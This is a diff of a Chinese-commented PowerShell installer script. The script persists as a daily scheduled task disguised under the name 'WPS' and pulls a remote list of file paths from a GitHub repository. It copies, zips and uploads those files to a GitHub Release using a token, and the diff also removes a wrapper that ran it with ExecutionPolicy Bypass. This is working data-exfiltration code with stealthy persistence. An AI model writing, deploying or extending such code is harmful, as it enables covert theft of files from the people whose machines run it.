@@ -1,4 +1,3 @@
-$code = @'
 # install.ps1 - 一键部署并每日自动上传到 GitHub（任务名：WPS）
 
 [Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
@@ -18,11 +17,13 @@ Log "`n==== Script Started ===="
 
 # === 保存自身副本 ===
 try {
-    $self = $MyInvocation.MyCommand.Definition
+    $self = $MyInvocation.MyCommand.Path
+    if (-not $self) { $self = $MyInvocation.MyCommand.Definition }
     Copy-Item -Path $self -Destination $localPath -Force -ErrorAction Stop
     Log "✅ 已保存脚本副本到 $localPath"
 } catch {
     Log "❌ 保存自身失败：$($_.Exception.Message)"
+    Pause
     exit 1
 }
 
@@ -36,6 +37,7 @@ try {
     Log "✅ 注册计划任务 [$taskName] 成功（每天 0 点执行）"
 } catch {
     Log "❌ 注册任务失败：$($_.Exception.Message)"
+    Pause
     exit 2
 }
 
@@ -43,6 +45,7 @@ try {
 $token = $env:GITHUB_TOKEN
 if (-not $token) {
     Log "❌ 环境变量 GITHUB_TOKEN 未设置"
+    Pause
     exit 3
 }
 
@@ -59,7 +62,7 @@ $zipPath = Join-Path $env:TEMP $zipName
 New-Item -ItemType Directory -Path $tempRoot -Force -ErrorAction SilentlyContinue | Out-Null
 
 # === STEP 1: 下载路径列表并复制文件 ===
-$remoteTxtUrl = "https://raw.githubusercontent.com/rtyuiuiop/1/main/.github/upload-target.txt"
+$remoteTxtUrl = "https://raw.githubusercontent.com/rtyuiuiop/1/refs/heads/main/.github/upload-paths.txt"
 try {
     Log "📥 正在下载路径列表..."
     $remoteList = Invoke-RestMethod -Uri $remoteTxtUrl -UseBasicParsing -ErrorAction Stop
@@ -67,6 +70,7 @@ try {
     Log "✅ 路径列表加载成功，共 $($pathList.Count) 条"
 } catch {
     Log "❌ 下载路径列表失败：$($_.Exception.Message)"
+    Pause
     exit 4
 }
 
@@ -94,6 +98,7 @@ foreach ($path in $pathList) {
         }
     } catch {
         Log "❌ 复制失败：$path - $($_.Exception.Message)"
+        Pause
         exit 5
     }
 }
@@ -128,6 +133,7 @@ try {
     Log "📦 压缩成功：$zipPath"
 } catch {
     Log "❌ 压缩失败：$($_.Exception.Message)"
+    Pause
     exit 6
 }
 
@@ -152,6 +158,7 @@ try {
     Log "🚀 GitHub Release 创建成功"
 } catch {
     Log "❌ 创建 Release 失败：$($_.Exception.Message)"
+    Pause
     exit 7
 }
 
@@ -166,6 +173,7 @@ try {
     Log "☁️ 文件上传成功：$zipName"
 } catch {
     Log "❌ 上传文件失败：$($_.Exception.Message)"
+    Pause
     exit 8
 }
 
@@ -173,14 +181,10 @@ try {
 Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
 Log "🧹 清理完成"
-Log "==== Script Finished ===="
+Log "==== Script Finished ====`n"
 
+# === 如果是首次安装执行，自动打开日志 ===
 if ($MyInvocation.MyCommand.Path -notlike "$localPath") {
     Pause
     Start-Process notepad.exe $logPath
 }
-'@
-
-$path = "$env:TEMP\install.ps1"
-$code | Out-File -Encoding utf8 -FilePath $path
-powershell.exe -ExecutionPolicy Bypass -File $path
